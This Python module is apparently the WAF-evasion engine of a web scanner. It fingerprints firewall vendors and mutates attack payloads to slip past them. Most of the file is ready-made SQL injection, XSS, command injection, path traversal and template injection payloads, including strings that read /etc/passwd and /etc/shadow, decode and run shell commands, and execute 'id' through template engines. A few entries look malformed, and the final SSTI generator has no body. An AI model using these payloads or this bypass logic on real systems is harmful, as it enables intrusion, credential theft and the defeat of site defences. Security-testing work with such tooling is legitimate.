"""
waf_evasion.py — Centralised WAF Evasion & Payload Mutation Engine
===================================================================

Provides encoding, obfuscation, and transformation techniques that
allow scanner payloads to bypass Web Application Firewalls.

Design principles:
  1. **Generator-based** — yields mutated payloads lazily so scanners
     can stop early when a hit is found without generating the full set.
  2. **Composable** — individual transforms can be composed (e.g.
     case-alternate THEN comment-insert) for deep evasion.
  3. **Category-aware** — SQL / XSS / CMDi / Path / SSTI each have
     domain-specific mutation strategies.
  4. **WAF fingerprint** — optional probe to detect WAF vendor and
     select the best evasion profile.

Evasion techniques implemented:
  ┌─────────────────────────────────────┐
  │ ENCODING                            │
  │  URL single / double / triple       │
  │  Unicode (UTF-8 overlong, %u00xx)   │
  │  HTML entity (decimal, hex, named)  │
  │  Hex (\x41, 0x41)                   │
  │  Octal                              │
  │  Base64 (for eval sinks)            │
  ├─────────────────────────────────────┤
  │ SQL-SPECIFIC                        │
  │  Case alternation (SeLeCt)          │
  │  Inline comment (SEL/**/ECT)        │
  │  MySQL conditional (/*!50000 */)    │
  │  Whitespace alternatives (%09 %0a)  │
  │  String concatenation (CONCAT)      │
  │  Numeric obfuscation                │
  │  Scientific notation                │
  │  Null-byte prefix                   │
  │  HTTP Parameter Pollution           │
  ├─────────────────────────────────────┤
  │ XSS-SPECIFIC                        │
  │  Tag case variation (<ScRiPt>)      │
  │  Event handler alternatives         │
  │  SVG / MathML / details tags        │
  │  JavaScript protocol variants       │
  │  Backtick template literals         │
  │  Unicode JS escapes                 │
  │  Double encoding                    │
  │  DOM clobbering vectors             │
  ├─────────────────────────────────────┤
  │ CMDI-SPECIFIC                       │
  │  Variable insertion ($@, ${IFS})    │
  │  Wildcard glob (/e?c/p?sswd)       │
  │  Hex-encoded commands               │
  │  Newline / tab separators           │
  │  Backtick / $() substitution        │
  ├─────────────────────────────────────┤
  │ PATH TRAVERSAL                      │
  │  Encoding variants (%, %25)         │
  │  UTF-8 overlong (..%c0%af)          │
  │  Double-dot smuggling (....//       │
  │  Null-byte termination              │
  │  OS-specific separators             │
  ├─────────────────────────────────────┤
  │ SSTI                                │
  │  Alternate delimiters               │
  │  Unicode escape in template expr    │
  │  Concatenation-based bypass         │
  │  Filter bypass chains               │
  └─────────────────────────────────────┘
"""
from __future__ import annotations

import random
import re
import string
import urllib.parse
from typing import Any, Dict, Generator, List, Optional, Tuple


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# WAF Detection / Fingerprinting
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WAF_SIGNATURES: List[Tuple[str, str, str]] = [
    # (header_name_pattern, value_pattern, waf_name)
    ("server",         r"cloudflare",                "cloudflare"),
    ("cf-ray",         r".",                         "cloudflare"),
    ("server",         r"awselb|amazons3|cloudfront", "aws"),
    ("x-amzn-requestid", r".",                       "aws"),
    ("server",         r"akamaighost",               "akamai"),
    ("x-akamai-transformed", r".",                   "akamai"),
    ("server",         r"sucuri|cloudproxy",          "sucuri"),
    ("x-sucuri-id",    r".",                          "sucuri"),
    ("server",         r"imperva|incapsula",          "imperva"),
    ("x-cdn",          r"imperva",                    "imperva"),
    ("server",         r"barracuda",                  "barracuda"),
    ("server",         r"f5 big-?ip",                 "f5"),
    ("x-powered-by-plesk", r".",                      "plesk"),
    ("server",         r"mod_security|modsecurity",   "modsecurity"),
    ("x-waf-event-info", r".",                        "modsecurity"),
    ("x-denied-reason", r".",                         "modsecurity"),
    ("server",         r"fortiweb",                   "fortinet"),
    ("server",         r"paloalto",                   "paloalto"),
]

# Probe payload — should trigger most WAFs
WAF_PROBE_PAYLOAD = "' OR 1=1-- <script>alert(1)</script> ../../etc/passwd"


def detect_waf(headers: Dict[str, str]) -> Optional[str]:
    """Fingerprint WAF from HTTP response headers.

    Returns WAF name string or None if no WAF detected.
    """
    if not headers:
        return None
    for hdr_pattern, val_pattern, waf_name in WAF_SIGNATURES:
        for name, value in headers.items():
            if re.search(hdr_pattern, name, re.IGNORECASE):
                if re.search(val_pattern, value, re.IGNORECASE):
                    return waf_name
    return None


def is_waf_blocked(status_code: int, text: str = "", headers: Dict[str, str] = None) -> bool:
    """Heuristic: does this response look like a WAF block page?"""
    if status_code in (403, 406, 429, 503):
        lowered = (text or "").lower()
        block_indicators = [
            "access denied", "blocked", "forbidden",
            "request rejected", "web application firewall",
            "waf", "security policy", "not acceptable",
            "rate limit", "captcha", "challenge",
            "cloudflare", "incapsula", "sucuri",
            "mod_security", "please verify",
        ]
        if any(ind in lowered for ind in block_indicators):
            return True
    return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Generic Encoding Transforms
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def url_encode(payload: str) -> str:
    """Standard URL-encode all non-alphanumeric characters."""
    return urllib.parse.quote(payload, safe="")


def double_url_encode(payload: str) -> str:
    """Double URL-encode — bypasses single-decode WAFs."""
    return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")


def unicode_encode(payload: str) -> str:
    """IIS-style %u00xx Unicode encoding."""
    return "".join(
        f"%u{ord(c):04x}" if not c.isalnum() else c
        for c in payload
    )


def html_entity_encode(payload: str, mode: str = "decimal") -> str:
    """HTML entity encode — decimal (&#60;) or hex (&#x3c;) or named."""
    result = []
    named_map = {"<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;", "&": "&amp;"}
    for c in payload:
        if mode == "named" and c in named_map:
            result.append(named_map[c])
        elif mode == "hex":
            result.append(f"&#x{ord(c):x};")
        else:
            result.append(f"&#{ord(c)};")
    return "".join(result)


def hex_encode_string(s: str) -> str:
    """Hex-encode string — useful for SQL CHAR() and JS \\x escapes."""
    return "".join(f"\\x{ord(c):02x}" for c in s)


def octal_encode_string(s: str) -> str:
    """Octal encode for JS and shell payloads."""
    return "".join(f"\\{ord(c):03o}" for c in s)


def null_byte_prefix(payload: str) -> str:
    """Prepend null byte — bypasses some input validation."""
    return f"%00{payload}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SQL Injection Evasion
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def sql_case_alternate(payload: str) -> str:
    """Alternating case: SELECT → SeLeCt."""
    result = []
    upper_next = True
    for c in payload:
        if c.isalpha():
            result.append(c.upper() if upper_next else c.lower())
            upper_next = not upper_next
        else:
            result.append(c)
    return "".join(result)


def sql_comment_insert(payload: str) -> str:
    """Insert inline comments within SQL keywords: SELECT → SEL/**/ECT.

    Only splits keywords, preserves non-keyword text.
    """
    keywords = [
        "SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "WHERE",
        "FROM", "ORDER", "GROUP", "HAVING", "LIMIT", "SLEEP",
        "WAITFOR", "DELAY", "BENCHMARK", "LOAD_FILE",
        "INTO", "OUTFILE", "CONCAT", "SUBSTR", "SUBSTRING",
        "ASCII", "CHAR", "DROP", "ALTER", "CREATE", "EXEC",
        "EXECUTE",
    ]
    result = payload
    for kw in keywords:
        # Case-insensitive replacement, insert /**/ in the middle
        pattern = re.compile(re.escape(kw), re.IGNORECASE)
        mid = len(kw) // 2
        replacement = kw[:mid] + "/**/" + kw[mid:]
        result = pattern.sub(replacement, result)
    return result


def sql_mysql_conditional(payload: str) -> str:
    """MySQL version-conditional comments: /*!50000 SELECT */ — executes on MySQL >= 5.0."""
    keywords = ["SELECT", "UNION", "WHERE", "ORDER", "FROM", "SLEEP", "BENCHMARK"]
    result = payload
    for kw in keywords:
        pattern = re.compile(r'\b' + re.escape(kw) + r'\b', re.IGNORECASE)
        result = pattern.sub(f"/*!50000 {kw} */", result)
    return result


def sql_whitespace_substitute(payload: str) -> str:
    """Replace spaces with alternative whitespace characters."""
    alternatives = ["%09", "%0a", "%0d", "%0b", "%0c", "%a0"]
    alt = random.choice(alternatives)
    return payload.replace(" ", alt)


def sql_concat_strings(value: str) -> str:
    """Break a string into CONCAT() calls: 'admin' → CONCAT('ad','min')."""
    if len(value) < 4:
        return f"'{value}'"
    mid = len(value) // 2
    return f"CONCAT('{value[:mid]}','{value[mid:]}')"


def sql_char_encode(value: str) -> str:
    """Encode a string as CHAR() calls: 'admin' → CHAR(97,100,109,105,110)."""
    return "CHAR(" + ",".join(str(ord(c)) for c in value) + ")"


def sql_hex_encode(value: str) -> str:
    """Hex-encode a string: 'admin' → 0x61646d696e."""
    return "0x" + value.encode().hex()


def generate_sqli_evasion_payloads(
    base_payloads: List[str],
    max_variants: int = 8,
) -> Generator[Tuple[str, str], None, None]:
    """Generate WAF-evading variants of SQLi payloads.

    Yields (mutated_payload, evasion_technique_name) tuples.
    First yields originals, then progressively deeper evasion.
    """
    # Phase 1: Original payloads (no evasion)
    for p in base_payloads:
        yield p, "none"

    # Phase 2: Whitespace substitution
    for p in base_payloads[:max_variants]:
        yield sql_whitespace_substitute(p), "whitespace-sub"

    # Phase 3: Inline comment insertion
    for p in base_payloads[:max_variants]:
        evaded = sql_comment_insert(p)
        if evaded != p:
            yield evaded, "comment-insert"

    # Phase 4: Case alternation
    for p in base_payloads[:max_variants]:
        yield sql_case_alternate(p), "case-alternate"

    # Phase 5: MySQL conditional comments
    for p in base_payloads[:max_variants]:
        evaded = sql_mysql_conditional(p)
        if evaded != p:
            yield evaded, "mysql-conditional"

    # Phase 6: URL encoding
    for p in base_payloads[:max_variants]:
        yield url_encode(p), "url-encode"

    # Phase 7: Double URL encoding
    for p in base_payloads[:max_variants]:
        yield double_url_encode(p), "double-url-encode"

    # Phase 8: Composite — case alternate + comment insert
    for p in base_payloads[:4]:
        evaded = sql_comment_insert(sql_case_alternate(p))
        yield evaded, "case+comment"

    # Phase 9: Composite — whitespace + case + comment
    for p in base_payloads[:3]:
        evaded = sql_whitespace_substitute(
            sql_comment_insert(sql_case_alternate(p))
        )
        yield evaded, "case+comment+ws"

    # Phase 10: Null-byte prefix
    for p in base_payloads[:3]:
        yield null_byte_prefix(p), "null-byte"


# Additional pre-built SQLi WAF bypass payloads
SQLI_WAF_BYPASS_PAYLOADS: List[Tuple[str, str]] = [
    # Comment-based
    ("'/**/OR/**/1=1--",                       "comment-spaces"),
    ("'/**/oR/**/1=1--",                       "comment+case"),
    ("'/**/OR/**/1=1#",                        "comment-hash"),

    # Whitespace alternatives
    ("'\tOR\t1=1--",                            "tab-whitespace"),
    ("'\nOR\n1=1--",                            "newline-whitespace"),
    ("'\rOR\r1=1--",                            "cr-whitespace"),
    ("'%09OR%091=1--",                          "tab-encoded"),
    ("'%0aOR%0a1=1--",                          "lf-encoded"),
    ("'%0dOR%0d1=1--",                          "cr-encoded"),
    ("'%a0OR%a01=1--",                          "nbsp-encoded"),

    # Case alternation
    ("' oR 1=1--",                              "case-mix"),
    ("' Or 1=1--",                              "case-mix2"),

    # MySQL inline conditional
    ("' /*!50000OR*/ 1=1--",                    "mysql-conditional"),
    ("' /*!50000OR*/ /*!50000 1*/=/*!50000 1*/--", "mysql-conditional-deep"),
    ("'/*!50000%6fR*/ 1=1--",                   "mysql-hex-or"),
    ("'-1'/*!50000UNION*//*!50000SELECT*/1,2,3--", "mysql-union-cond"),

    # Double keyword (bypass keyword stripping)
    ("' OORR 1=1--",                            "double-keyword"),
    ("' UNUNIONION SELSELECTECT 1,2,3--",       "double-union-select"),

    # URL encoding
    ("%27%20OR%201%3D1--",                      "url-encode"),
    ("%27%20OR%201%3D1%2D%2D",                  "full-url-encode"),

    # Double URL encoding
    ("%2527%2520OR%25201%253D1--",              "double-url-encode"),

    # Unicode / IIS
    ("%u0027%u0020OR%u00201=1--",               "unicode-encode"),

    # Hex encoding 1=1 → 0x313d31
    ("' OR 0x313d31--",                         "hex-compare"),

    # CHAR encoding
    ("' OR CHAR(49)=CHAR(49)--",               "char-encode"),

    # Scientific notation (e.g. bypass numeric filters)
    ("' OR 1e0=1e0--",                          "scientific-notation"),

    # No-space techniques
    ("'OR(1=1)--",                              "no-space-parens"),
    ("'OR'1'='1'--",                            "no-space-quotes"),

    # String concat bypass (MySQL)
    ("' OR 'a'='a'--",                          "string-compare"),
    ("' OR CONCAT('1')=CONCAT('1')--",         "concat-compare"),

    # Between/like bypass
    ("' OR 1 BETWEEN 1 AND 1--",               "between-bypass"),
    ("' OR 1 LIKE 1--",                         "like-bypass"),

    # NULL-based
    ("' OR NULL IS NULL--",                     "null-is-null"),
    ("' OR NOT 1=2--",                          "not-inverse"),

    # Buffer overflow prefix (some WAFs give up on long input)
    ("A" * 4000 + "' OR 1=1--",                "buffer-overflow"),

    # HPP (HTTP Parameter Pollution) — value split
    ("' OR 1=",                                 "hpp-split-1"),

    # Comment termination variants
    ("' OR 1=1-- -",                            "double-dash-space"),
    ("' OR 1=1#",                               "hash-comment"),
    ("' OR 1=1;%00",                            "null-term"),

    # MSSQL specific
    ("'; EXEC('SEL'+'ECT 1')--",               "mssql-concat"),
    ("'; WAITFOR DELAY '0:0:2'--",             "mssql-waitfor"),

    # PostgreSQL specific
    ("'; SELECT PG_SLEEP(2)--",                "pg-sleep"),
    ("' OR 1=1::int--",                        "pg-cast"),

    # Boolean without OR/AND keywords
    ("' | 1=1--",                               "pipe-or"),
    ("' || 1=1--",                              "double-pipe-or"),
    ("' && 1=1--",                              "double-amp-and"),
]


# Time-based WAF bypass payloads
SQLI_TIME_WAF_BYPASS: List[Tuple[str, str]] = [
    # MySQL
    ("' OR SL/**/EEP(2)--",                    "sleep-comment"),
    ("' OR SLEEP/**/(2)--",                    "sleep-parens-comment"),
    ("' OR /*!50000SLEEP*/(2)--",              "sleep-conditional"),
    ("' OR (SELECT SLEEP(2))--",               "sleep-subquery"),
    ("' OR BENCHMARK(5000000,SHA1('x'))--",    "benchmark"),
    ("' OR IF(1=1,SLEEP(2),0)--",              "if-sleep"),
    ("1; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END--",
     "pg-case-sleep"),
    # MSSQL
    ("'; WAITFOR%20DELAY%20'0:0:2'--",         "waitfor-encode"),
    ("'; WA/**/ITFOR DE/**/LAY '0:0:2'--",     "waitfor-comment"),
]


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# XSS Evasion
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def xss_case_alternate_tag(payload: str) -> str:
    """Alternate case on HTML tags: <script> → <ScRiPt>."""
    def _alt_tag(m: re.Match) -> str:
        tag = m.group(0)
        return "".join(
            c.upper() if i % 2 else c.lower()
            for i, c in enumerate(tag)
        )
    return re.sub(r'</?[a-zA-Z]+', _alt_tag, payload)


def xss_double_encode(payload: str) -> str:
    """Double URL-encode angle brackets and quotes."""
    return (payload
            .replace("<", "%253C")
            .replace(">", "%253E")
            .replace('"', "%2522")
            .replace("'", "%2527"))


def generate_xss_evasion_payloads(
    marker: str,
    max_variants: int = 30,
) -> Generator[Tuple[str, str], None, None]:
    """Generate WAF-evading XSS payloads with the given marker.

    Yields (payload, technique_name) tuples.
    """
    m = marker  # shorthand

    # ── Phase 1: Tag-based vectors with case variation ──
    yield f'<ScRiPt>alert("{m}")</ScRiPt>',                        "case-alternate"
    yield f'<SCRIPT>alert("{m}")</SCRIPT>',                        "uppercase-tag"
    yield f'<scr<script>ipt>alert("{m}")</scr</script>ipt>',       "nested-tag"

    # ── Phase 2: Event handler diversity ──
    yield f'<img src=x oNeRrOr=alert("{m}")>',                     "onerror-case"
    yield f'<img/src=x onerror=alert("{m}")>',                     "img-slash"
    yield f'<body onload=alert("{m}")>',                           "body-onload"
    yield f'<svg/onload=alert("{m}")>',                            "svg-onload"
    yield f'<svg onload=alert`{m}`>',                              "svg-backtick"
    yield f'<details open ontoggle=alert("{m}")>',                 "details-ontoggle"
    yield f'<marquee onstart=alert("{m}")>',                       "marquee-onstart"
    yield f'<video src=x onerror=alert("{m}")>',                   "video-onerror"
    yield f'<audio src=x onerror=alert("{m}")>',                   "audio-onerror"
    yield f'<input onfocus=alert("{m}") autofocus>',               "input-autofocus"
    yield f'<select onfocus=alert("{m}") autofocus>',              "select-autofocus"
    yield f'<textarea onfocus=alert("{m}") autofocus>',            "textarea-autofocus"
    yield f'<keygen onfocus=alert("{m}") autofocus>',              "keygen-autofocus"
    yield f'<isindex action=javascript:alert("{m}") type=image>',  "isindex"
    yield f'<object data="javascript:alert(\'{m}\')">',            "object-data"
    yield f'<embed src="javascript:alert(\'{m}\')">',              "embed-src"

    # ── Phase 3: JavaScript protocol variants ──
    yield f'"><a href="javascript:alert(\'{m}\')">click</a>',     "href-javascript"
    yield f'"><a href="jaVaScRiPt:alert(\'{m}\')">click</a>',     "href-js-case"
    yield f'"><a href="java&#115;cript:alert(\'{m}\')">click</a>', "href-entity"
    yield f'"><a href="&#106;avascript:alert(\'{m}\')">click</a>', "href-entity2"
    yield f'"><a href="&#x6a;avascript:alert(\'{m}\')">click</a>', "href-hex-entity"
    yield f'"><a href="javascript\t:alert(\'{m}\')">click</a>',   "href-tab"
    yield f'"><a href="javascript\n:alert(\'{m}\')">click</a>',   "href-newline"

    # ── Phase 4: SVG / MathML vectors ──
    yield f'<svg><script>alert("{m}")</script></svg>',             "svg-script"
    yield f'<svg><animate onbegin=alert("{m}") attributeName=x dur=1s>', "svg-animate"
    yield f'<svg><set onbegin=alert("{m}") attributename=x to=1>', "svg-set"
    yield f'<math><maction actiontype="statusline#" xlink:href="javascript:alert(\'{m}\')">click', "mathml"

    # ── Phase 5: Encoding-based bypass ──
    yield f'<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(&#39;{m}&#39;)">', "html-entity-alert"
    yield f'<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074("{m}")>',     "unicode-escape"
    encoded_alert = _b64(f'alert("{m}")')
    yield f"<img src=x onerror=eval(atob('{encoded_alert}'))>", "base64-eval"

    # ── Phase 6: Backtick / Template literal ──
    yield f'<script>alert`{m}`</script>',                          "backtick-call"
    yield f'"><script>alert`{m}`</script>',                        "break-backtick"
    yield f'<img src=x onerror=alert`{m}`>',                       "img-backtick"

    # ── Phase 7: Null byte / comment injection ──
    yield f'<scri%00pt>alert("{m}")</scri%00pt>',                  "null-byte-tag"
    yield f'<scri\\x00pt>alert("{m}")</scri\\x00pt>',              "null-byte-hex"
    yield f'<!--><script>alert("{m}")</script>-->',                "html-comment"

    # ── Phase 8: Double encoding ──
    yield f'%3Cscript%3Ealert("{m}")%3C/script%3E',               "url-encoded"
    yield f'%253Cscript%253Ealert("{m}")%253C/script%253E',        "double-encoded"

    # ── Phase 9: Context-specific breakouts ──
    yield f'"-alert("{m}")-"',                                     "js-string-break"
    yield f"'-alert('{m}')-'",                                     "js-string-break2"
    yield f'}};alert("{m}");//',                                   "js-block-break"
    yield f']}};alert("{m}");//',                                  "js-array-break"
    yield f'</script><script>alert("{m}")</script>',               "script-break"
    yield f'</style><script>alert("{m}")</script>',                "style-break"
    yield f'</title><script>alert("{m}")</script>',                "title-break"
    yield f'</textarea><script>alert("{m}")</script>',             "textarea-break"
    yield f'</noscript><script>alert("{m}")</script>',             "noscript-break"

    # ── Phase 10: Polyglot ──
    yield (
        f'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert("{m}") )'
        f'//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/'
        f'--!>\\x3csVg/<sVg/oNloAd=alert("{m}")//>>\\x3e'
    ), "polyglot"

    yield (
        f"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"
        f'";\'>alert(String.fromCharCode(88,83,83))//";>'
        f'alert(String.fromCharCode(88,83,83))//--></SCRIPT>'
        f'">\'>alert("{m}")<SCRIPT>alert("{m}")</SCRIPT>'
    ), "polyglot2"


def _b64(s: str) -> str:
    """Base64 encode a string for use in atob() payloads."""
    import base64
    return base64.b64encode(s.encode()).decode()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Command Injection Evasion
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CMDI_WAF_BYPASS_PAYLOADS: List[Tuple[str, str, str]] = [
    # (payload, detection_type, technique)
    # detection_type: "time" = time-based, "output" = output-based

    # ── Variable insertion ($@, ${}, empty vars) ──
    (";wh$@oami",                       "output", "empty-var"),
    (";who$()ami",                      "output", "empty-subshell"),
    (";w'h'o'a'm'i",                   "output", "quote-split"),
    (';w"h"o"a"m"i',                   "output", "dquote-split"),
    (";wh\\oami",                       "output", "backslash-insert"),

    # ── IFS (Internal Field Separator) substitution ──
    (";cat${IFS}/etc/passwd",           "output", "ifs-separator"),
    (";cat$IFS/etc/passwd",             "output", "ifs-no-brace"),
    (";{cat,/etc/passwd}",              "output", "brace-expansion"),

    # ── Wildcard / glob bypass ──
    (";/???/c?t /???/p?sswd",           "output", "wildcard-glob"),
    (";/???/c?t${IFS}/???/p?sswd",      "output", "wildcard+ifs"),

    # ── Hex / octal encoded commands ──
    (";$(printf '\\x77\\x68\\x6f\\x61\\x6d\\x69')", "output", "hex-printf"),
    (";$(printf '\\167\\150\\157\\141\\155\\151')",   "output", "octal-printf"),
    (";$'\\x77\\x68\\x6f\\x61\\x6d\\x69'",           "output", "ansi-c-hex"),

    # ── Newline / tab separators ──
    ("%0awhoami",                        "output", "newline-separator"),
    ("%0dwhoami",                        "output", "cr-separator"),
    ("%0a%0dwhoami",                     "output", "crlf-separator"),

    # ── Backtick substitution ──
    (";`whoami`",                        "output", "backtick-sub"),
    ("|`cat /etc/passwd`",               "output", "backtick-pipe"),

    # ── $() substitution ──
    (";$(whoami)",                       "output", "dollar-sub"),
    ("|$(cat /etc/passwd)",              "output", "dollar-pipe"),

    # ── Base64-decode execution ──
    (";echo d2hvYW1p|base64 -d|sh",     "output", "base64-exec"),
    (";bash<<<$(base64 -d<<<d2hvYW1p)", "output", "herestring-b64"),

    # ── Concatenation bypass ──
    (";/bin/ca$()t /etc/pas$()swd",      "output", "concat-empty-sub"),
    (";a]la]s a=cat;$a /etc/passwd",     "output", "alias-bypass"),

    # ── Time-based variants ──
    (";sl$@eep 2",                       "time", "sleep-empty-var"),
    (";sle\\ep 2",                       "time", "sleep-backslash"),
    (";$(printf 'sleep 2'|sh)",          "time", "sleep-printf-pipe"),
    ("|sle${IFS}ep${IFS}2",             "time", "sleep-ifs"),
    (";s]l]e]e]p 2",                     "time", "sleep-brackets"),

    # ── Windows-specific ──
    ("& ping -n 3 127.0.0.1",           "time", "win-ping"),
    ("| p^i^n^g -n 3 127.0.0.1",        "time", "win-caret-ping"),
    ("& t^i^m^e^o^u^t 2",               "time", "win-caret-timeout"),
    ("& cmd /c \"whoami\"",              "output", "win-cmd-exec"),
    ("| set /p=x < NUL & timeout 2",    "time", "win-set-timeout"),
    ("& for /F %i in ('whoami') do echo %i", "output", "win-for-loop"),
]


def generate_cmdi_evasion_payloads() -> Generator[Tuple[str, str, str], None, None]:
    """Generate WAF-evading command injection payloads.

    Yields (payload, detection_type, technique) tuples.
    detection_type is "time" or "output".
    """
    for payload, dtype, technique in CMDI_WAF_BYPASS_PAYLOADS:
        yield payload, dtype, technique


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Path Traversal Evasion
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PATH_WAF_BYPASS_PAYLOADS: List[Tuple[str, str]] = [
    # ── Standard encoding variants ──
    ("..%2f..%2f..%2f..%2fetc%2fpasswd",            "url-encode-slash"),
    ("..%252f..%252f..%252f..%252fetc%252fpasswd",   "double-encode-slash"),
    ("%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",       "url-encode-dots"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "full-url-encode"),

    # ── UTF-8 overlong encoding ──
    ("..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",  "utf8-overlong"),
    ("..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",  "utf8-fullwidth"),
    ("..%c1%9c..%c1%9c..%c1%9cetc/passwd",           "utf8-overlong2"),

    # ── Double dot smuggling ──
    ("....//....//....//....//etc/passwd",            "double-dot-smuggle"),
    ("..../..../..../..../etc/passwd",                "quadruple-dot"),
    ("....\\\\....\\\\....\\\\etc\\\\passwd",         "backslash-smuggle"),
    ("..\\..\\..\\.\\etc\\passwd",                    "mixed-separator"),

    # ── Null byte termination (PHP < 5.3.4, older apps) ──
    ("../../../etc/passwd%00",                        "null-byte"),
    ("../../../etc/passwd%00.jpg",                    "null-byte-ext"),
    ("../../../etc/passwd%00.html",                   "null-byte-ext2"),
    ("../../../etc/passwd\x00",                       "null-byte-raw"),

    # ── Path normalization tricks ──
    ("/./../.././../.././../../etc/passwd",           "dot-normalization"),
    ("/../../../etc/passwd",                          "leading-slash-dotdot"),
    ("..;/..;/..;/..;/etc/passwd",                   "semicolon-dotdot"),
    ("..\\..\\..\\..\\etc\\passwd",                   "backslash-unix"),

    # ── Absolute path bypass ──
    ("/etc/passwd",                                   "absolute-direct"),
    ("///etc///passwd",                                "triple-slash"),
    ("/etc/./passwd",                                 "dot-in-path"),
    ("file:///etc/passwd",                            "file-protocol"),

    # ── Windows-specific ──
    ("..\\..\\..\\..\\windows\\win.ini",              "win-backslash"),
    ("..%5c..%5c..%5c..%5cwindows%5cwin.ini",        "win-encoded-bs"),
    ("..%255c..%255c..%255c..%255cwindows%255cwin.ini", "win-double-encode"),
    ("....\\\\....\\\\....\\\\windows\\\\win.ini",    "win-dot-smuggle"),
    ("/..\\../..\\../windows/win.ini",                "win-mixed-sep"),

    # ── Interesting target files (beyond /etc/passwd) ──
    ("../../../proc/self/environ",                    "proc-environ"),
    ("../../../proc/self/cmdline",                    "proc-cmdline"),
    ("../../../etc/shadow",                           "shadow-file"),
    ("../../../etc/hosts",                            "hosts-file"),
    ("../../../var/log/apache2/access.log",           "apache-log"),
    ("../../../var/log/nginx/access.log",             "nginx-log"),
]


def generate_path_traversal_evasion_payloads() -> Generator[Tuple[str, str], None, None]:
    """Generate WAF-evading path traversal payloads.

    Yields (payload, technique_name) tuples.
    """
    for payload, technique in PATH_WAF_BYPASS_PAYLOADS:
        yield payload, technique


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SSTI Evasion
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SSTI_WAF_BYPASS_PAYLOADS: List[Tuple[str, str, str]] = [
    # (payload, expected_output, technique)

    # ── Jinja2 filter chains ──
    ("{{7*7}}",                                         "49",       "jinja2-basic"),
    ("{%set x=7*7%}{{x}}",                              "49",       "jinja2-set-var"),
    ("{{''.__class__}}",                                "__class__", "jinja2-introspect"),
    ("{{config}}",                                      "Config",   "jinja2-config"),
    ("{{request.environ}}",                             "environ",  "jinja2-environ"),
    ("{{self.__init__.__globals__}}",                    "globals",  "jinja2-globals"),

    # ── Jinja2 bypass |attr filter ──
    ("{{request|attr('application')}}",                 "application", "jinja2-attr-filter"),
    ("{{''|attr('__class__')}}",                        "__class__",   "jinja2-attr-class"),

    # ── Jinja2 string concatenation bypass ( {{}} block filter ) ──
    ("{{''.join(['_','_','class','_','_'])}}",           "__class__",   "jinja2-join"),
    ("{{().__class__}}",                                "class",       "jinja2-tuple-class"),

    # ── Jinja2 with Unicode ──
    ("{{\u0037*\u0037}}",                               "49",          "jinja2-unicode"),

    # ── Twig ──
    ("{{7*7}}",                                         "49",          "twig-basic"),
    ("{{7*'7'}}",                                       "49",          "twig-string"),
    ("{{_self.env.display('id')}}",                     "uid",         "twig-env"),

    # ── Freemarker ──
    ("${7*7}",                                          "49",          "freemarker-basic"),
    ("<#assign x=7*7>${x}",                             "49",          "freemarker-assign"),
    ("${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
     "uid",                                                            "freemarker-exec"),

    # ── ERB ──
    ("<%= 7*7 %>",                                      "49",          "erb-basic"),
    ("<%= system('id') %>",                             "uid",         "erb-system"),

    # ── Expression Language (Java) ──
    ("${7*7}",                                          "49",          "el-basic"),
    ("#{7*7}",                                          "49",          "el-hash"),
    ("*{7*7}",                                          "49",          "spel-basic"),

    # ── Smarty ──
    ("{7*7}",                                           "49",          "smarty-basic"),
    ("{if 7*7 == 49}SSTI{/if}",                         "SSTI",        "smarty-if"),

    # ── Mako ──
    ("${7*7}",                                          "49",          "mako-basic"),

    # ── Pebble ──
    ('{% set x = 7*7 %}{{x}}',                          "49",          "pebble-set"),
]


def generate_ssti_evasion_payloads() -> Generator[Tuple[str, str, str], None, None]:
    """Generate WAF-evading SSTI payloads.

    Yields (payload, expected_output, technique) tuples.
    """
